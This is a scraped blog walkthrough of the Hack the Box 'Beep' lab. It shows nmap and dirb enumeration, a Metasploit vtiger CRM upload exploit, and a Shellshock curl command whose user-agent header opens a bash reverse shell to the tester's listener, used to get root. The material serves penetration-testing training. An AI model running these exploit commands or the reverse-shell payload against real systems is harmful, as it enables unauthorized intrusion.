@@ -1,0 +1,216 @@
+
+								
+																		Hack the Box Challenge: Beep Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 26, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									
+Hello friends!! Today we are going to solve another CTF challenge “Beep” which is available online for those who want to increase their skill in penetration testing and black box testing. Sense is retried vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level, they have a collection of vulnerable labs as challenges from beginners to Expert level. We are going to start a new series of hack the box beginning with Beep craft which is designed for beginners.
+Level: Intermediate
+Task: find user.txt and root.txt file in the victim’s machine.
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.7 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -sV 10.10.10.7
+			
+				
+					
+				
+					1
+				
+						nmap -sV 10.10.10.7
+					
+				
+			
+		
+
+From given below image, you can observe we found port 22,25,80,110,111,143,443,993,995,3306,4445,10000 are open in victim’s network.
+
+Knowing port 80 is open in the victim’s network we preferred to explore his IP in the browser but didn’t get any remarkable clue for the next step.
+
+As you can see we are redirected to the Elastix Login Portal in the image below.
+
+Next, we have used dirb tool of Kali to enumerate the directories from the .txt file. The command we have used is dirb /usr/share/wordlists/dirb/big.txt . After checking most of the directories, we finally decided to go for the vtigercrm directory. 
+
+So next we decided to explore http://10.10.10.7/vitercrm through browser URL and what we see is another Login Portal of vtiger CRM 5 browser. After looking at the page for some clue, we saw a version of vtiger which is vtiger CRM 5.1 in the bottom left of the Webpage. As Shown Below.
+
+Then we decided to search this version of vtiger CRM 5.1 on google. Which came out to be a Metasploit’s Exploit.
+
+We have used Metasploit exploit /vtiger_soap_upload and got the meterpreter as you can see below.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/http/vtiger_soap_upload
+msf exploit(multi/http/vtiger_soap_upload) set rhost 10.10.10.7
+msf exploit(multi/http/vtiger_soap_upload) set rport 443
+msf exploit(multi/http/vtiger_soap_upload) set ssl true
+msf exploit(multi/http/vtiger_soap_upload) exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/multi/http/vtiger_soap_uploadmsf exploit(multi/http/vtiger_soap_upload) set rhost 10.10.10.7msf exploit(multi/http/vtiger_soap_upload) set rport 443msf exploit(multi/http/vtiger_soap_upload) set ssl truemsf exploit(multi/http/vtiger_soap_upload) exploit
+					
+				
+			
+		
+
+Great!!! We got meterpreter session 1 opened
+
+Once we have got the meterpreter. We have used command cd /home to check what kind of directories are on home. Then we check inside the fanis directory using command ls /home/fanis, here we found out the user.txt file and used cat user.txt to read the file content which contains our first FLAG!!
+
+		
+		
+			
+			
+			
+			
+pwd
+cd /home
+ls
+cd fanis
+ls
+cat user.txt
+			
+				
+					
+				
+					123456
+				
+						pwdcd /homelscd fanislscat user.txt
+					
+				
+			
+		
+
+
+In the beginning, we say port 10000 was also open when we scanned the IP using NMAP command. We opened the port 10000 along with the IP in the browser. This gave us a bad request, but the clicking on the URL open up the page.
+
+Clicking on the URL given in the previous step just redirected us to Webmin login Portal as you can see in the image below.
+
+As we don’t know the username and password credential for this portal. So we decided to use some random username’s and password’s which shows us a new directory name at the end of the URL which is session_login.cgi.
+
+Now we decided to use curl to exploit vulnerability In this command we have given the local hosts IP, the port number so that we can start out listener services using netcat command on this port and we have given victims URL.
+
+		
+		
+			
+			
+			
+			
+curl -k -H "user-agent: () { :; }; bash -i &gt;&amp; /dev/tcp/10.10.14.3/8081 0&gt;&amp;1" https://10.10.10.7:10000/session_login.cgi
+			
+				
+					
+				
+					1
+				
+						curl -k -H "user-agent: () { :; }; bash -i &gt;&amp; /dev/tcp/10.10.14.3/8081 0&gt;&amp;1" https://10.10.10.7:10000/session_login.cgi
+					
+				
+			
+		
+
+
+After executing our curl command, we have simply started our listening services using netcat command nc -lvp 8081. Once we have established a connection with the Victim Host. We used command ls to look for files, a folder in the current directory.
+
+The ls command which gave us the root.txt file. Whose content we would like to see by using the cat root.txt command.
+Finally, we found our final FLAG!!
+
+Author: Ashray Gupta is a Researcher and Technical Writer at Hacking Articles. He is a certified ethical hacker, web penetration tester and a researcher in nanotechnology. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
